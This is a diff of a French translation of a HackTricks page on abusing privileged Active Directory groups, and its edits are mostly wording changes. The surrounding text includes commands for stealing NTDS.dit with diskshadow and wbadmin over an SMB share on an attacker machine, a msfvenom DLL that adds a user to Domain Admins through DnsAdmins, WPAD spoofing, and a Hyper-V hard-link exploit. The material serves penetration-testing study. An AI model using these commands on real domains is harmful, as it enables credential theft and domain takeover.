@@ -45,8 +45,8 @@ Ainsi que se connecter localement à DC01 :
 
 ## Groupe AdminSDHolder
 
-La Liste de Contrôle d'Accès (ACL) de l'objet **AdminSDHolder** est utilisée comme modèle pour **copier** les **permissions** sur **tous les "groupes protégés"** dans Active Directory et leurs membres. Les groupes protégés incluent des groupes privilégiés tels que les Domain Admins, les Administrateurs, les Enterprise Admins et les Schema Admins.\
-Par défaut, l'ACL de ce groupe est copiée dans tous les "groupes protégés". Cela est fait pour éviter des modifications intentionnelles ou accidentelles à ces groupes critiques. Cependant, si un attaquant modifie l'ACL du groupe **AdminSDHolder** en donnant par exemple des permissions complètes à un utilisateur régulier, cet utilisateur aura des permissions complètes sur tous les groupes à l'intérieur du groupe protégé (en une heure).\
+La liste de contrôle d'accès (ACL) de l'objet **AdminSDHolder** est utilisée comme modèle pour **copier** les **permissions** sur **tous les "groupes protégés"** dans Active Directory et leurs membres. Les groupes protégés incluent des groupes privilégiés tels que les Domain Admins, les Administrateurs, les Enterprise Admins et les Schema Admins.\
+Par défaut, l'ACL de ce groupe est copiée dans tous les "groupes protégés". Cela est fait pour éviter des modifications intentionnelles ou accidentelles de ces groupes critiques. Cependant, si un attaquant modifie l'ACL du groupe **AdminSDHolder**, par exemple en donnant des permissions complètes à un utilisateur régulier, cet utilisateur aura des permissions complètes sur tous les groupes à l'intérieur du groupe protégé (en une heure).\
 Et si quelqu'un essaie de supprimer cet utilisateur des Domain Admins (par exemple) en une heure ou moins, l'utilisateur sera de retour dans le groupe.
 
 Obtenir les **membres** du groupe :
@@ -87,7 +87,7 @@ L'histoire change :
 
 ![](../../.gitbook/assets/a6.png)
 
-### Élévation de Privilèges <a href="#backup-operators" id="backup-operators"></a>
+### Élévation de privilèges <a href="#backup-operators" id="backup-operators"></a>
 
 Utilisez [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) ou `sc`, de Sysinternals, pour vérifier les permissions sur un service.
 ```
@@ -107,9 +107,9 @@ Vous pouvez abuser de ce service pour [**faire exécuter des commandes arbitrair
 
 ## Opérateurs de Sauvegarde <a href="#backup-operators" id="backup-operators"></a>
 
-Comme pour l'appartenance aux `Server Operators`, nous pouvons **accéder au système de fichiers de `DC01`** si nous appartenons aux `Opérateurs de Sauvegarde`.
+Comme pour l'appartenance aux `Server Operators`, nous pouvons **accéder au système de fichiers `DC01`** si nous appartenons aux `Opérateurs de Sauvegarde`.
 
-Cela est dû au fait que ce groupe accorde à ses **membres** les privilèges [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) et [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5). Le **SeBackupPrivilege** nous permet de **traverser n'importe quel dossier et de lister** le contenu du dossier. Cela nous permettra de **copier un fichier d'un dossier,** même si aucune autre permission ne vous est accordée. Cependant, pour abuser de ces permissions afin de copier un fichier, le drapeau [**FILE\_FLAG\_BACKUP\_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) \*\*\*\* doit être utilisé. Par conséquent, des outils spéciaux sont nécessaires.
+Cela est dû au fait que ce groupe accorde à ses **membres** les privilèges [**`SeBackup`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) et [**`SeRestore`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5). Le **SeBackupPrivilege** nous permet de **traverser n'importe quel dossier et de lister** le contenu du dossier. Cela nous permettra de **copier un fichier d'un dossier,** même si rien d'autre ne vous donne les permissions. Cependant, pour abuser de ces permissions pour copier un fichier, le drapeau [**FILE\_FLAG\_BACKUP\_SEMANTICS**](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) \*\*\*\* doit être utilisé. Par conséquent, des outils spéciaux sont nécessaires.
 
 À cette fin, vous pouvez utiliser [**ces scripts**](https://github.com/giuliano108/SeBackupPrivilege)**.**
 
@@ -140,7 +140,7 @@ Par exemple, vous pouvez accéder directement au système de fichiers du Contrô
 
 Vous pouvez abuser de cet accès pour **voler** la base de données de l'annuaire actif **`NTDS.dit`** afin d'obtenir tous les **hashes NTLM** pour tous les objets utilisateur et ordinateur dans le domaine.
 
-#### Utilisation de diskshadow.exe pour extraire NTDS.dit
+#### Utilisation de diskshadow.exe pour dumper NTDS.dit
 
 En utilisant [**diskshadow**](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow), vous pouvez **créer une copie de l'ombre** du **disque `C`** et, par exemple, sur le disque `F`. Ensuite, vous pouvez voler le fichier `NTDS.dit` de cette copie de l'ombre car il ne sera pas utilisé par le système :
 ```
@@ -184,7 +184,7 @@ L'utilisation de wbadmin.exe est très similaire à celle de diskshadow.exe, l'u
 
 Avant de l'utiliser, vous devez [**configurer le système de fichiers ntfs pour le serveur smb**](https://gist.github.com/manesec/9e0e8000446b966d0f0ef74000829801) sur la machine de l'attaquant.
 
-Lorsque vous avez terminé de configurer le serveur smb, vous devez mettre en cache les identifiants smb sur la machine cible :
+Une fois que vous avez configuré le serveur smb, vous devez mettre en cache les identifiants smb sur la machine cible :
 ```
 # cache the smb credential.
 net use X: \\<AttackIP>\sharename /user:smbuser password
@@ -206,7 +206,7 @@ echo "Y" | wbadmin start recovery -version:10/09/2023-23:48 -itemtype:file -item
 ```
 Si cela réussit, cela déversera dans `C:\ntds.dit`.
 
-[VIDÉO DE DÉMONSTRATION AVEC IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)
+[VIDÉO DÉMO AVEC IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)
 
 ## DnsAdmins
 
@@ -244,24 +244,22 @@ Ou vous pourriez générer un dll en utilisant msfvenom :
 ```bash
 msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
 ```
-Donc, lorsque le **DNSservice** démarre ou redémarre, un nouvel utilisateur sera créé.
+Lorsque le **DNSservice** démarre ou redémarre, un nouvel utilisateur sera créé.
 
-Même en ayant un utilisateur dans le groupe DNSAdmin, vous **ne pouvez pas par défaut arrêter et redémarrer le service DNS.** Mais vous pouvez toujours essayer de faire :
+Même en ayant un utilisateur dans le groupe DNSAdmin, vous **ne pouvez pas, par défaut, arrêter et redémarrer le service DNS.** Mais vous pouvez toujours essayer de faire :
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-[**En savoir plus sur cette escalade de privilèges sur ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
-
 #### Mimilib.dll
 
-Comme détaillé dans ce [**post**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), il est également possible d'utiliser [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) du créateur de l'outil `Mimikatz` pour obtenir l'exécution de commandes en **modifiant** le fichier [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) \*\*\*\* afin d'exécuter un **reverse shell** en une ligne ou une autre commande de notre choix.
+Comme détaillé dans ce [**post**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), il est également possible d'utiliser [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) du créateur de l'outil `Mimikatz` pour obtenir l'exécution de commandes en **modifiant** le fichier [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) pour exécuter un **reverse shell** en une ligne ou une autre commande de notre choix.
 
 ### Enregistrement WPAD pour MitM
 
-Une autre manière d'**abuser des privilèges du groupe DnsAdmins** est de créer un **enregistrement WPAD**. L'appartenance à ce groupe nous donne le droit de [désactiver la sécurité de blocage des requêtes globales](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), qui par défaut bloque cette attaque. Le serveur 2008 a introduit pour la première fois la capacité d'ajouter à une liste de blocage de requêtes globales sur un serveur DNS. Par défaut, le protocole de découverte automatique de proxy web (WPAD) et le protocole d'adressage automatique de tunnel intra-site (ISATAP) sont sur la liste de blocage de requêtes globales. Ces protocoles sont très vulnérables au détournement, et tout utilisateur du domaine peut créer un objet ordinateur ou un enregistrement DNS contenant ces noms.
+Une autre manière d'**abuser des privilèges du groupe DnsAdmins** est de créer un **enregistrement WPAD**. L'appartenance à ce groupe nous donne le droit de [désactiver la sécurité de blocage des requêtes globales](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), qui par défaut bloque cette attaque. Le serveur 2008 a introduit pour la première fois la capacité d'ajouter à une liste de blocage de requêtes globales sur un serveur DNS. Par défaut, le protocole de découverte automatique de proxy web (WPAD) et le protocole d'adressage automatique de tunnel intra-site (ISATAP) sont sur la liste de blocage de requêtes globales. Ces protocoles sont très vulnérables au détournement, et tout utilisateur de domaine peut créer un objet ordinateur ou un enregistrement DNS contenant ces noms.
 
-Après avoir **désactivé la liste de blocage des requêtes globales** et créé un **enregistrement WPAD**, **chaque machine** exécutant WPAD avec les paramètres par défaut aura son **trafic proxifié via notre machine d'attaque**. Nous pourrions utiliser un outil tel que \*\*\*\* [**Responder**](https://github.com/lgandx/Responder) **ou** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **pour effectuer le spoofing de trafic**, et tenter de capturer les hachages de mots de passe et de les craquer hors ligne ou réaliser une attaque SMBRelay.
+Après avoir **désactivé la liste de blocage des requêtes globales** et créé un **enregistrement WPAD**, **chaque machine** exécutant WPAD avec les paramètres par défaut aura son **trafic proxifié via notre machine d'attaque**. Nous pourrions utiliser un outil tel que [**Responder**](https://github.com/lgandx/Responder) **ou** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **pour effectuer le spoofing de trafic**, et tenter de capturer les hachages de mots de passe et de les craquer hors ligne ou réaliser une attaque SMBRelay.
 
 {% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
 [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
@@ -269,7 +267,7 @@ Après avoir **désactivé la liste de blocage des requêtes globales** et cré�
 
 ## Lecteurs de journaux d'événements
 
-Les membres du groupe [**Lecteurs de journaux d'événements**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) \*\*\*\* ont **l'autorisation d'accéder aux journaux d'événements** générés (tels que les journaux de création de nouveaux processus). Dans les journaux, des **informations sensibles** pourraient être trouvées. Voyons comment visualiser les journaux :
+Les membres du groupe [**Lecteurs de journaux d'événements**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN) ont **l'autorisation d'accéder aux journaux d'événements** générés (tels que les journaux de création de nouveaux processus). Dans les journaux, des **informations sensibles** pourraient être trouvées. Voyons comment visualiser les journaux :
 ```powershell
 #Get members of the group
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
@@ -286,7 +284,7 @@ Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -an
 ## Permissions Windows Exchange
 
 Les membres se voient accorder la capacité de **modifier un DACL sur l'objet domaine**. Un attaquant pourrait exploiter cela pour **donner à un utilisateur** des privilèges [**DCSync**](dcsync.md).\
-Si Microsoft Exchange est installé dans l'environnement AD, il est courant de trouver des comptes utilisateurs et même des ordinateurs membres de ce groupe.
+Si Microsoft Exchange est installé dans l'environnement AD, il est courant de trouver des comptes d'utilisateurs et même des ordinateurs en tant que membres de ce groupe.
 
 Ce [**dépôt GitHub**](https://github.com/gdedrouas/Exchange-AD-Privesc) explique quelques **techniques** pour **élever les privilèges** en abusant des permissions de ce groupe.
 ```powershell
@@ -297,13 +295,13 @@ Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 
 Le groupe [**Administrateurs Hyper-V**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) a un accès complet à toutes les [fonctionnalités Hyper-V](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). Si les **Contrôleurs de Domaine** ont été **virtualisés**, alors les **admins de virtualisation** doivent être considérés comme des **Admins de Domaine**. Ils pourraient facilement **créer un clone du Contrôleur de Domaine actif** et **monter** le **disque virtuel** hors ligne pour obtenir le fichier **`NTDS.dit`** et extraire les hachages de mot de passe NTLM pour tous les utilisateurs du domaine.
 
-Il est également bien documenté dans ce [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), qu'en **supprimant** une machine virtuelle, `vmms.exe` tente de **restaurer les permissions de fichier originales** sur le fichier **`.vhdx`** correspondant et le fait en tant que `NT AUTHORITY\SYSTEM`, sans s'impersonnaliser l'utilisateur. Nous pouvons **supprimer le fichier `.vhdx`** et **créer** un **lien physique natif** pour pointer ce fichier vers un **fichier SYSTEM protégé**, et vous obtiendrez des permissions complètes dessus.
+Il est également bien documenté dans ce [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), qu'en **supprimant** une machine virtuelle, `vmms.exe` tente de **restaurer les permissions de fichier originales** sur le fichier **`.vhdx`** correspondant et le fait en tant que `NT AUTHORITY\SYSTEM`, sans se faire passer pour l'utilisateur. Nous pouvons **supprimer le fichier `.vhdx`** et **créer** un **lien physique natif** pour que ce fichier pointe vers un **fichier SYSTEM protégé**, et vous obtiendrez des permissions complètes dessus.
 
 Si le système d'exploitation est vulnérable à [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) ou [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), nous pouvons exploiter cela pour obtenir des privilèges SYSTEM. Sinon, nous pouvons essayer de **profiter d'une application sur le serveur qui a installé un service fonctionnant dans le contexte de SYSTEM**, qui peut être démarré par des utilisateurs non privilégiés.
 
 ### **Exemple d'exploitation**
 
-Un exemple de ceci est **Firefox**, qui installe le **`Mozilla Maintenance Service`**. Nous pouvons mettre à jour [cet exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (une preuve de concept pour le lien physique NT) pour accorder à notre utilisateur actuel des permissions complètes sur le fichier ci-dessous :
+Un exemple de cela est **Firefox**, qui installe le **`Mozilla Maintenance Service`**. Nous pouvons mettre à jour [cet exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (une preuve de concept pour le lien physique NT) pour accorder à notre utilisateur actuel des permissions complètes sur le fichier ci-dessous :
 ```bash
 C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 ```
@@ -327,7 +325,7 @@ Ce vecteur a été atténué par les mises à jour de sécurité Windows de mars
 
 Ce groupe se trouve également dans les environnements avec **Microsoft Exchange** installé.\
 les membres de ce groupe peuvent **accéder** aux **boîtes aux lettres** de **tous** les utilisateurs du domaine.\
-Ce groupe a également un **contrôle total** de l'OU appelée `Microsoft Exchange Security Groups`, qui contient le groupe [**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions) \*\*\*\* (suivez le lien pour voir comment abuser de ce groupe pour une élévation de privilèges).
+Ce groupe a également un **contrôle total** de l'OU appelé `Microsoft Exchange Security Groups`, qui contient le groupe [**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions) \*\*\*\* (suivez le lien pour voir comment abuser de ce groupe pour une élévation de privilèges).
 
 ## Opérateurs d'impression
 
@@ -345,7 +343,7 @@ Obtenir les **membres** du groupe :
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-Consultez sur cette page comment abuser de SeLoadDriverPrivilege pour privesc :
+Consultez sur cette page comment exploiter le SeLoadDriverPrivilege pour une élévation de privilèges :
 
 {% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
 [abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
@@ -380,7 +378,7 @@ Plus d'informations sur **WinRM** :
 
 ## Opérateurs de serveur <a href="#server-operators" id="server-operators"></a>
 
-Cette appartenance permet aux utilisateurs de configurer les Contrôleurs de Domaine avec les privilèges suivants :
+Cette appartenance permet aux utilisateurs de configurer les contrôleurs de domaine avec les privilèges suivants :
 
 * Autoriser la connexion locale
 * Sauvegarder des fichiers et répertoires
@@ -428,7 +426,7 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 
 <details>
 
-<summary><strong>Apprenez le hacking AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>
 
 Autres moyens de soutenir HackTricks :
 
@@ -436,6 +434,6 @@ Autres moyens de soutenir HackTricks :
 * Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Partagez vos astuces de hacking en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
